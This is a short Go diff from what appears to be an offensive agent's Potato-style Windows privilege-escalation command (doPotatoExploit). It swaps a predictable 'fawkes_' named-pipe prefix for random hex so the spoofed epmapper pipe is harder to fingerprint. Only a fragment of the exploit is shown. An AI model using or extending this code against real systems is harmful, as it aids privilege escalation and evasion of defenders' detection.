@@ -4,8 +4,10 @@
 package commands
 
 import (
+	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
+	"encoding/hex"
 	"fmt"
 	"runtime"
 	"strings"
@@ -475,7 +477,9 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	// may connect simultaneously. With a single instance, accepting our own
 	// connection first means RPCSS's connection is rejected.
 	atomic.StoreInt32(phase, 4)
-	pipeUniqueName := fmt.Sprintf("fawkes_%d", time.Now().UnixNano()%100000)
+	var rndBytes [6]byte
+	rand.Read(rndBytes[:])
+	pipeUniqueName := hex.EncodeToString(rndBytes[:])
 	pipeName := fmt.Sprintf(`\\.\pipe\%s\pipe\epmapper`, pipeUniqueName)
 	potatoGlobal.pipeName = pipeName
 	potatoGlobal.pipeUniqueName = pipeUniqueName
